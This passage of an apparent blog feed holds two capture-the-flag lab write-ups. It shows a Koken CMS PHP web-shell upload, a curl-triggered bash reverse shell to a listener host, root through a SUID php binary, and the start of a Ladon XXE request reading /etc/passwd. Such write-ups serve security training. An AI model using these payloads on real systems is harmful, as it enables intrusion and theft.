&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit koken
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                                         |  Path
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Koken CMS 0.22.24 - Arbitrary File Upload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                              | php/webapps/48706.txt
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;koken-cms-rce&quot;&gt;&lt;strong&gt;Koken CMS RCE&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Following the steps in the &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;PoC&lt;/a&gt;, we first need to authenticate as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user with the credentials that we’ve obtained earlier - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daisa@photographer.com:babygirl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;[1]. Create a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php.jpg&lt;/code&gt; file with the following contents.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;image.php.jpg
&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[2]. From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Koken CMS Dashboard&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Import Content&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Library&lt;/code&gt; tab → import &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;image.php.jpg&lt;/code&gt; → intercept the request with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Rename the file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;image.php&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forward&lt;/code&gt; the request.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The final payload might look like the following.&lt;/p&gt;
&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api.php?/content HTTP/1.1
Host: 192.168.57.76:8000
...
-----------------------------392967243522561067211768914619
Content-Disposition: form-data; name=&quot;name&quot;

image.php
...
-----------------------------392967243522561067211768914619
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;image.php&quot;
Content-Type: image/jpeg

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php system([&apos;cmd&apos;]); ?&amp;gt;&lt;/span&gt;

-----------------------------392967243522561067211768914619--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;[3]. In the similar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dashboard&lt;/code&gt;, hover the mouse on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download File&lt;/code&gt; to inspect the uploaded &lt;strong&gt;link location&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;If file is uploaded properly, we can pull a reverse shell using the below command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.57.76:8000/storage/originals/1e/26/image.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.57.200%2F80%200%3E%261%27
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.57.200] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.57.76] 37502
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1383&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device                                                                                                                                                             
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@photographer:/var/www/html/koken/storage/originals/1e/26&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id                                                                                                                                                                     
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;misconfigured-suid-binary&quot;&gt;&lt;strong&gt;Misconfigured SUID Binary&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Locally navigate around the system divulges a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID binary&lt;/code&gt; that ends up privilege escalation.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@photographer:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null                                                                                                                                                           
&amp;lt;www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null                       
...
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 4883680 Jul  9  2020 /usr/bin/php7.2
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell, we execute&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@photographer:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/php7.2 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pcntl_exec(&apos;/bin/bash&apos;, [&apos;-p&apos;]);&quot;&lt;/span&gt;
root@photographer:/var/www# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and successfully compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!.&lt;/p&gt;</content><author><name></name></author><category term="linux" /><category term="pg" /><category term="ctf" /><summary type="html">Summary of Result With a valid credetials acquired from SMB service, we attain the initial foothold by exploiting the Authenticated Remote Code Execution (RCE) of the vulnerable Koken CMS. We then escalate our privilege by abusing a misconfigured SUID binary and successfully compromise root access.</summary></entry><entry><title type="html">Muddy - OSPG</title><link href="https://jayngng.github.io/blog/muddy-ospg/" rel="alternate" type="text/html" title="Muddy - OSPG" /><published>2021-09-02T01:01:01+10:00</published><updated>2021-09-02T01:01:01+10:00</updated><id>https://jayngng.github.io/blog/muddy---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/muddy-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Remote enumeration discloses a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML External Entity (XEE)&lt;/code&gt; vulnerability of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ladon&lt;/code&gt; running on a higher port of a web application. Misusing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XEE&lt;/code&gt; to read a configuration file, which bears credentials of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdav&lt;/code&gt; service. With the credentials, we can exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authenticated WebDav file upload&lt;/code&gt; to secure an initial access. We then escalate our privilege by leveraging &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path hijacking&lt;/code&gt; vulnerability of a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;Nmap&lt;/h4&gt;
&lt;p&gt;We will begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/services &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
PORT     STATE SERVICE       REASON         VERSION 
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:  
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkD
neyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I
2r                        
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
25/tcp   open  smtp          syn-ack ttl 63 Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.69], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:                      
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://muddy.ugc/
111/tcp  open  rpcbind       syn-ack ttl 63 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  tcpwrapped    syn-ack ttl 63
808/tcp  open  ccproxy-http? syn-ack ttl 63
908/tcp  open  unknown       syn-ack ttl 63
8888/tcp open  http          syn-ack ttl 63 WSGIServer 0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python 2.7.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: WSGIServer/0.1 Python/2.7.16
|_http-title: Ladon Service Catalog
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;There are a few open services, the web application running on port 8888 is our concentration.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;http8888&quot;&gt;&lt;strong&gt;HTTP/8888&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; result, we notice that the server is employing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ladon Service Catalog&lt;/code&gt;, we can obtain the same info with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://muddy.ugc:8888/                                                                                                                                                        1 ⚙

...

                &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;catName&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Ladon Service Catalog&amp;lt;/div&amp;gt;
              
...

                &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;catGen&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Powered by Ladon &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Python&amp;lt;/div&amp;gt;
        &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Further enumeration reveals that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;muddy&lt;/code&gt; is the only one service run by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ladon&lt;/code&gt;. To access the service, we navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/muddy&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://muddy.ugc:8888/muddy | html2text                                                                                                                                       1 ⚙
muddy
skins: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;One of: Default/Bluebox/Rounded]
Service Description:
None
Available Interfaces:
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; xmlrpc &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; url description &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; jsonrpc10 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; url description &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; jsonwsp &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; url description &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; soapdocumentliteral &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; url description &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; soap11 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; url description &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; soap &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; url description &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
Methods:
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; checkout &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  string  uid &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
      None
      Paramters:
          o uid:  string
            None
      Returns:  string
      None
Types:
Powered by Ladon &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Python
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s worth taking note of the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkout&lt;/code&gt; and the service &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;muddy&lt;/code&gt;, since they might be useful later on.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;xee-ladon&quot;&gt;&lt;strong&gt;XEE Ladon&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;With a few investigations, we discover that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ladon&lt;/code&gt; is vulnerable to XEE.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit ladon  
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                              |  Path
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Ladon Framework &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Python 0.9.40 - XML External Entity Exp | xml/webapps/43113.txt
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the exploit payload found in the above PoC, we modify:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;the method to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkout&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sayhello&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;the service to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;muddy&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HelloService&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s us try to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The request might look as follows.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;$&apos;POST&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;$&apos;Content-Type: text/xml;charset=UTF-8&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;$&apos;SOAPAction: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://muddy.ugc:8888/muddy/soap11/checkout&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-binary&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;$&apos;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;
quote&amp;gt; &amp;lt;!DOCTYPE uid
[&amp;lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;
]&amp;gt;
quote&amp;gt; &amp;lt;soapenv:Envelope xmlns:xsi=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://www.w3.org/2001/XMLSchema-instance&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
quote&amp;gt; xmlns:xsd=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://www.w3.org/2001/XMLSchema&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;

quote&amp;gt; xmlns:soapenv=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://schemas.xmlsoap.org/soap/envelope/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
quote&amp;gt; xmlns:urn=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;urn:muddy&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;gt;&amp;lt;soapenv:Header/&amp;gt;
quote&amp;gt; &amp;lt;soapenv:Body&amp;gt;
quote&amp;gt; &amp;lt;urn:checkout soapenv:encodingStyle=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://schemas.xmlsoap.org/soap/encoding/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;gt;
&amp;lt;uid xsi:type=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;xsd:string&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;gt;&amp;amp;passwd;&amp;lt;/uid&amp;gt;
quote&amp;gt; &amp;lt;/urn:checkout&amp;gt;
&amp;lt;/soapenv:Body&amp;gt;
